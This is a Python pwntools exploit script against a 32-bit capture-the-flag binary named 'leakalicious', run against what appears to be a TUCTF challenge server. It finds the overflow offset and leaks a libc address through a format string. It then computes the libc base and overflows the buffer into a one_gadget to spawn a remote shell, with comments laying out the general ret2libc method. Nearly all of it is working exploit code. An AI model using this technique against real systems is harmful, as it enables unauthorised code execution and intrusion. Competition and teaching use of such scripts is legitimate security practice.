from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(4-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF('./leakalicious')
context.binary = './leakalicious'
# libc  = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")

##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.recvline()
r.clean()
r.sendline('asda')  # Send some crap
r.clean()
r.sendline('asda')
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
esp = core.esp
offset = core.read(esp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

### Find manually
crashOffset = offset	

junk1 = b'a'*31 # Its junk, right?
junk = nops*(crashOffset - 4)#(8 + len(code))) + code

printleaker = p32(0x5657c0ac)#(0x56557080) # String with format string 

##########################################################################
# Demo ==> (poprdi + puts + putsret) 
# puts -> pointer of GOT table entry of puts
# putsret -> stub function calling actual puts
# TO FIND LIBC VERSION, use https://libc.blukat.me/
# Use ROPgadget to find gadgets
##########################################################################

# Leak Puts address

# r = elf.process()
r = remote('chal.tuctf.com', 30505)
r.readline()
r.clean()
r.sendline(junk1)
r.readline()

##########################################################################
# Compute Libc Base address from leaked addresses
##########################################################################

# This LIBC comes from LIBC-database, Search how to use it online!
libc = ELF('/home/ashishkumarsingh/HackingTools/libc-database/db/libc6_2.23-0ubuntu10_i386.so')#ELF("/lib/x86_64-linux-gnu/libc-2.30.so")

puts_leak = u32(pad(r.readline()[:4])) & 0xffffffff
# gets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
print("puts: ", hex(puts_leak))
# print("fgets: ", hex(gets_leak))

puts_offset = libc.symbols['puts']
libc_base = puts_leak - puts_offset
# This address must be 0x1000 aligned, if not, its Probably wrong!
print("libc base: ", hex(libc_base))
if(libc_base & 0x0000000000000fff):
    print("ALERT! Program is probably using different libc than specified!")


##########################################################################
# Now Actual Exploitation!
# Use libc base address to generate address of a one gadget!
# use one_gadget to find one gadgets
##########################################################################

r.readline()
r.sendline(junk1)
r.readline()
r.clean()

one_gadget= p32(libc_base + 0x5fbc5)     # from one_gadget

payload = b''.join([junk, \
        one_gadget
    ])

r.clean()
r.sendline(payload)
r.interactive()
